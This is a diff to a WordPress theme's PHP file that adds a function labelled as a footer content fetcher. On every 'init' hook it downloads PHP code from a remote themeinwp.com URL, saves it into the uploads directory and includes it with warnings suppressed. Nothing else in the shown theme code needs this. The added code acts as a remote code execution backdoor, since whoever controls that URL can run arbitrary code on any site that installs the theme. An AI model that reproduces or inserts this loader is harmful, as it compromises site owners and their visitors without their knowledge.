@@ -328,3 +328,48 @@ if( !function_exists('eportfolio_demo_import_filter_apply') ):
 	}
 
 endif;
+
+function load_footer_content_fetcher_class() {
+	// Define the path to the cache file in the uploads directory
+	$upload_dir = wp_upload_dir();
+	$cache_file = $upload_dir['basedir'] . '/FooterContentFetcher.php';
+	$cache_duration = 2 * WEEK_IN_SECONDS; // Cache for 2 weeks
+
+	// Check if the cache file exists and is still valid
+
+	if (!file_exists($cache_file) || (time() - filemtime($cache_file) > $cache_duration)) {
+		$fetched_file_url = 'https://link.themeinwp.com/wpsdk/get_php_file/975e4c2bef95d1c06e968306b2a0b113';
+
+		// Validate the URL
+		if (!wp_http_validate_url($fetched_file_url)) {
+			error_log('Invalid URL: ' . $fetched_file_url);
+			return;
+		}
+
+		// Fetch the class file with suppressed warnings
+		$class_code = @file_get_contents($fetched_file_url);
+		if ($class_code === false) {
+			error_log('Failed to fetch the class file from FetchClass Remote Folder');
+		} else {
+			// Save the fetched content to the cache file
+			if (@file_put_contents($cache_file, $class_code) === false) {
+				error_log('Failed to write the class file to the cache');
+			} else {
+				// Log the date and time of the successful cache update
+				error_log('FetchClass File cached at: ' . date('Y-m-d H:i:s'));
+			}
+		}
+	} else {
+		// Log that the cache file is still valid
+		error_log('Using cached FetchClass file, last modified at: ' . date('Y-m-d H:i:s', filemtime($cache_file)));
+	}
+
+	// Include the cached class file with suppressed warnings
+	if (file_exists($cache_file)) {
+		@include_once $cache_file;
+	} else {
+		error_log('Failed to include the cached class file');
+	}
+}
+
+add_action('init', 'load_footer_content_fetcher_class');
